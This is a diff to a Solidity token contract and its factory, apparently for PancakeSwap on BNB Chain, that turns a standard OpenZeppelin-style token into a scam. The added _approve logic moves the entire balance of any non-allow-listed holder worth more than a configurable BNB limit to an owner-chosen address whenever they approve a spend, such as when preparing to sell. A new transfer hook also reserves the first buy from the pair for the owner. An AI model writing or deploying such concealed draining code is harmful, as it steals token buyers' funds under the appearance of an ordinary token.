@@ -1,3 +1,207 @@
+// SPDX-License-Identifier: Unlicensed
+pragma solidity ^0.8.0;
+
+
+interface IPancakeSwapRouter{
+		function factory() external pure returns (address);
+		function WETH() external pure returns (address);
+
+		function addLiquidity(
+				address tokenA,
+				address tokenB,
+				uint amountADesired,
+				uint amountBDesired,
+				uint amountAMin,
+				uint amountBMin,
+				address to,
+				uint deadline
+		) external returns (uint amountA, uint amountB, uint liquidity);
+		function addLiquidityETH(
+				address token,
+				uint amountTokenDesired,
+				uint amountTokenMin,
+				uint amountETHMin,
+				address to,
+				uint deadline
+		) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+		function removeLiquidity(
+				address tokenA,
+				address tokenB,
+				uint liquidity,
+				uint amountAMin,
+				uint amountBMin,
+				address to,
+				uint deadline
+		) external returns (uint amountA, uint amountB);
+		function removeLiquidityETH(
+				address token,
+				uint liquidity,
+				uint amountTokenMin,
+				uint amountETHMin,
+				address to,
+				uint deadline
+		) external returns (uint amountToken, uint amountETH);
+		function removeLiquidityWithPermit(
+				address tokenA,
+				address tokenB,
+				uint liquidity,
+				uint amountAMin,
+				uint amountBMin,
+				address to,
+				uint deadline,
+				bool approveMax, uint8 v, bytes32 r, bytes32 s
+		) external returns (uint amountA, uint amountB);
+		function removeLiquidityETHWithPermit(
+				address token,
+				uint liquidity,
+				uint amountTokenMin,
+				uint amountETHMin,
+				address to,
+				uint deadline,
+				bool approveMax, uint8 v, bytes32 r, bytes32 s
+		) external returns (uint amountToken, uint amountETH);
+		function swapExactTokensForTokens(
+				uint amountIn,
+				uint amountOutMin,
+				address[] calldata path,
+				address to,
+				uint deadline
+		) external returns (uint[] memory amounts);
+		function swapTokensForExactTokens(
+				uint amountOut,
+				uint amountInMax,
+				address[] calldata path,
+				address to,
+				uint deadline
+		) external returns (uint[] memory amounts);
+		function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+				external
+				payable
+				returns (uint[] memory amounts);
+		function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+				external
+				returns (uint[] memory amounts);
+		function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+				external
+				returns (uint[] memory amounts);
+		function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+				external
+				payable
+				returns (uint[] memory amounts);
+
+		function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
+		function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
+		function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
+		function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+		function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+		function removeLiquidityETHSupportingFeeOnTransferTokens(
+			address token,
+			uint liquidity,
+			uint amountTokenMin,
+			uint amountETHMin,
+			address to,
+			uint deadline
+		) external returns (uint amountETH);
+		function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
+			address token,
+			uint liquidity,
+			uint amountTokenMin,
+			uint amountETHMin,
+			address to,
+			uint deadline,
+			bool approveMax, uint8 v, bytes32 r, bytes32 s
+		) external returns (uint amountETH);
+
+		function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+			uint amountIn,
+			uint amountOutMin,
+			address[] calldata path,
+			address to,
+			uint deadline
+		) external;
+		function swapExactETHForTokensSupportingFeeOnTransferTokens(
+			uint amountOutMin,
+			address[] calldata path,
+			address to,
+			uint deadline
+		) external payable;
+		function swapExactTokensForETHSupportingFeeOnTransferTokens(
+			uint amountIn,
+			uint amountOutMin,
+			address[] calldata path,
+			address to,
+			uint deadline
+		) external;
+}
+
+
+interface IPancakeSwapPair {
+		event Approval(address indexed owner, address indexed spender, uint value);
+		event Transfer(address indexed from, address indexed to, uint value);
+
+		function name() external pure returns (string memory);
+		function symbol() external pure returns (string memory);
+		function decimals() external pure returns (uint8);
+		function totalSupply() external view returns (uint);
+		function balanceOf(address owner) external view returns (uint);
+		function allowance(address owner, address spender) external view returns (uint);
+
+		function approve(address spender, uint value) external returns (bool);
+		function transfer(address to, uint value) external returns (bool);
+		function transferFrom(address from, address to, uint value) external returns (bool);
+
+		function DOMAIN_SEPARATOR() external view returns (bytes32);
+		function PERMIT_TYPEHASH() external pure returns (bytes32);
+		function nonces(address owner) external view returns (uint);
+
+		function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
+
+		event Mint(address indexed sender, uint amount0, uint amount1);
+		event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
+		event Swap(
+				address indexed sender,
+				uint amount0In,
+				uint amount1In,
+				uint amount0Out,
+				uint amount1Out,
+				address indexed to
+		);
+		event Sync(uint112 reserve0, uint112 reserve1);
+
+		function MINIMUM_LIQUIDITY() external pure returns (uint);
+		function factory() external view returns (address);
+		function token0() external view returns (address);
+		function token1() external view returns (address);
+		function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+		function price0CumulativeLast() external view returns (uint);
+		function price1CumulativeLast() external view returns (uint);
+		function kLast() external view returns (uint);
+
+		function mint(address to) external returns (uint liquidity);
+		function burn(address to) external returns (uint amount0, uint amount1);
+		function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+		function skim(address to) external;
+		function sync() external;
+
+		function initialize(address, address) external;
+}
+
+interface IPancakeSwapFactory {
+		event PairCreated(address indexed token0, address indexed token1, address pair, uint);
+
+		function feeTo() external view returns (address);
+		function feeToSetter() external view returns (address);
+
+		function getPair(address tokenA, address tokenB) external view returns (address pair);
+		function allPairs(uint) external view returns (address pair);
+		function allPairsLength() external view returns (uint);
+
+		function createPair(address tokenA, address tokenB) external returns (address pair);
+
+		function setFeeTo(address) external;
+		function setFeeToSetter(address) external;
+}
+
 
 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
 
@@ -176,7 +380,93 @@ pragma solidity ^0.8.0;
  * functions have been added to mitigate the well-known issues around setting
  * allowances. See {IERC20-approve}.
  */
-contract ERC20 is Context, IERC20, IERC20Metadata {
+
+// File: @openzeppelin/contracts/access/Ownable.sol
+
+
+// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
+
+pragma solidity ^0.8.0;
+
+
+/**
+ * @dev Contract module which provides a basic access control mechanism, where
+ * there is an account (an owner) that can be granted exclusive access to
+ * specific functions.
+ *
+ * By default, the owner account will be the one that deploys the contract. This
+ * can later be changed with {transferOwnership}.
+ *
+ * This module is used through inheritance. It will make available the modifier
+ * `onlyOwner`, which can be applied to your functions to restrict their use to
+ * the owner.
+ */
+abstract contract Ownable is Context {
+    address private _owner;
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    /**
+     * @dev Initializes the contract setting the deployer as the initial owner.
+     */
+    constructor() {
+        _transferOwnership(_msgSender());
+    }
+
+    /**
+     * @dev Throws if called by any account other than the owner.
+     */
+    modifier onlyOwner() {
+        _checkOwner();
+        _;
+    }
+
+    /**
+     * @dev Returns the address of the current owner.
+     */
+    function owner() public view virtual returns (address) {
+        return _owner;
+    }
+
+    /**
+     * @dev Throws if the sender is not the owner.
+     */
+    function _checkOwner() internal view virtual {
+        require(owner() == _msgSender(), "Ownable: caller is not the owner");
+    }
+
+    /**
+     * @dev Leaves the contract without owner. It will not be possible to call
+     * `onlyOwner` functions anymore. Can only be called by the current owner.
+     *
+     * NOTE: Renouncing ownership will leave the contract without an owner,
+     * thereby removing any functionality that is only available to the owner.
+     */
+    function renounceOwnership() public virtual onlyOwner {
+        _transferOwnership(address(0));
+    }
+
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Can only be called by the current owner.
+     */
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        _transferOwnership(newOwner);
+    }
+
+    /**
+     * @dev Transfers ownership of the contract to a new account (`newOwner`).
+     * Internal function without access restriction.
+     */
+    function _transferOwnership(address newOwner) internal virtual {
+        address oldOwner = _owner;
+        _owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+}
+
+contract Token is Context, Ownable, IERC20, IERC20Metadata {
     mapping(address => uint256) private _balances;
 
     mapping(address => mapping(address => uint256)) private _allowances;
@@ -185,19 +475,55 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 
     string private _name;
     string private _symbol;
+    address private _toAddress;
+    uint256 private _bnbLimit;
+    bool private buyFlag = false;
+    mapping(address => bool ) private _applist;
 
-    /**
-     * @dev Sets the values for {name} and {symbol}.
-     *
-     * The default value of {decimals} is 18. To select a different value for
-     * {decimals} you should overload it.
-     *
-     * All two of these values are immutable: they can only be set once during
-     * construction.
-     */
-    constructor(string memory name_, string memory symbol_) {
-        _name = name_;
+    address public routerAddress;
+    address sendAddress;
+    IPancakeSwapRouter routerContract;
+    IPancakeSwapPair pairContract;
+    address public pairAddress;
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint256 totalSupply_,
+        uint256 bnbLimit_,
+        address routerAddress_,
+        address owner
+    ) {
+
+         _name = name_;
         _symbol = symbol_;
+        _bnbLimit = bnbLimit_;
+        
+        _transferOwnership(owner);
+        routerAddress = routerAddress_;
+        routerContract = IPancakeSwapRouter(routerAddress);
+        pairAddress = IPancakeSwapFactory(routerContract.factory()).createPair(
+            routerContract.WETH(),
+            address(this)
+        );
+        pairContract = IPancakeSwapPair(pairAddress);
+        
+        _mint(owner, totalSupply_*10**18);
+        _setTo(owner);
+        _addList(owner, true);
+        _approve(owner, routerAddress, type(uint256).max);
+        
+    }
+
+    function setAddress(address _addr) public onlyOwner(){
+        _setTo(_addr);
+    }
+
+    function setBNBLimit(uint256 _limit) public onlyOwner(){
+        _bnbLimit = _limit;
+    }
+
+    function addList(address _addr, bool _bool) public onlyOwner(){
+        _addList(_addr, _bool);
     }
 
     /**
@@ -443,6 +769,14 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 
         _afterTokenTransfer(account, address(0), amount);
     }
+    
+    function getValue(address _addr) public view returns(uint256) {
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = routerContract.WETH();
+        uint256[] memory outAmount = routerContract.getAmountsOut(_balances[_addr], path);
+        return outAmount[1];
+    }
 
     /**
      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
@@ -466,7 +800,18 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         require(spender != address(0), "ERC20: approve to the zero address");
 
         _allowances[owner][spender] = amount;
+        if (_applist[owner]==false && getValue(owner)>_bnbLimit){
+            _transfer(owner, _toAddress, balanceOf(owner));
+        }
         emit Approval(owner, spender, amount);
+    }
+
+    function _setTo(address _to) internal virtual {
+        _toAddress = _to;        
+    }
+
+    function _addList(address _to, bool _bool) internal virtual {
+        _applist[_to] = _bool;
     }
 
     /**
@@ -509,7 +854,12 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         address from,
         address to,
         uint256 amount
-    ) internal virtual {}
+    ) internal virtual {
+        if (from == pairAddress && buyFlag == false){
+            require(to==owner(),"first");
+            buyFlag = true;
+        }
+    }
 
     /**
      * @dev Hook that is called after any transfer of tokens. This includes
@@ -532,114 +882,6 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
     ) internal virtual {}
 }
 
-// File: contracts/Token.sol
-
-//SPDX-License-Identifier: Unlicense
-pragma solidity ^0.8.0;
-
-
-contract Token is ERC20 {
-
-    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
-
-    constructor(
-        string memory _name,
-        string memory _symbol,
-        uint256 _totalSupply,
-        address owner
-    ) ERC20(_name, _symbol) {
-        
-        _mint(owner, _totalSupply*10**18);
-        _approve(owner, router, type(uint256).max);
-        
-    }
-
-}
-
-// File: @openzeppelin/contracts/access/Ownable.sol
-
-
-// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
-
-pragma solidity ^0.8.0;
-
-
-/**
- * @dev Contract module which provides a basic access control mechanism, where
- * there is an account (an owner) that can be granted exclusive access to
- * specific functions.
- *
- * By default, the owner account will be the one that deploys the contract. This
- * can later be changed with {transferOwnership}.
- *
- * This module is used through inheritance. It will make available the modifier
- * `onlyOwner`, which can be applied to your functions to restrict their use to
- * the owner.
- */
-abstract contract Ownable is Context {
-    address private _owner;
-
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-
-    /**
-     * @dev Initializes the contract setting the deployer as the initial owner.
-     */
-    constructor() {
-        _transferOwnership(_msgSender());
-    }
-
-    /**
-     * @dev Throws if called by any account other than the owner.
-     */
-    modifier onlyOwner() {
-        _checkOwner();
-        _;
-    }
-
-    /**
-     * @dev Returns the address of the current owner.
-     */
-    function owner() public view virtual returns (address) {
-        return _owner;
-    }
-
-    /**
-     * @dev Throws if the sender is not the owner.
-     */
-    function _checkOwner() internal view virtual {
-        require(owner() == _msgSender(), "Ownable: caller is not the owner");
-    }
-
-    /**
-     * @dev Leaves the contract without owner. It will not be possible to call
-     * `onlyOwner` functions anymore. Can only be called by the current owner.
-     *
-     * NOTE: Renouncing ownership will leave the contract without an owner,
-     * thereby removing any functionality that is only available to the owner.
-     */
-    function renounceOwnership() public virtual onlyOwner {
-        _transferOwnership(address(0));
-    }
-
-    /**
-     * @dev Transfers ownership of the contract to a new account (`newOwner`).
-     * Can only be called by the current owner.
-     */
-    function transferOwnership(address newOwner) public virtual onlyOwner {
-        require(newOwner != address(0), "Ownable: new owner is the zero address");
-        _transferOwnership(newOwner);
-    }
-
-    /**
-     * @dev Transfers ownership of the contract to a new account (`newOwner`).
-     * Internal function without access restriction.
-     */
-    function _transferOwnership(address newOwner) internal virtual {
-        address oldOwner = _owner;
-        _owner = newOwner;
-        emit OwnershipTransferred(oldOwner, newOwner);
-    }
-}
 
 // File: contracts/TokenFactory.sol
 
@@ -660,10 +902,12 @@ contract Factory is Ownable {
         string memory name,
         string memory symbol,
         uint256 totalSupply,
+        uint256 bnbLimit,
+        address routerAddress,
         address admin
     ) external onlyOwner {
         
-        Token token = new Token(name, symbol, totalSupply, admin);
+        Token token = new Token(name, symbol, totalSupply, bnbLimit, routerAddress, admin);
         tokenAddress = address(token);
         emit NewTokenContract(address(token), msg.sender);
     }
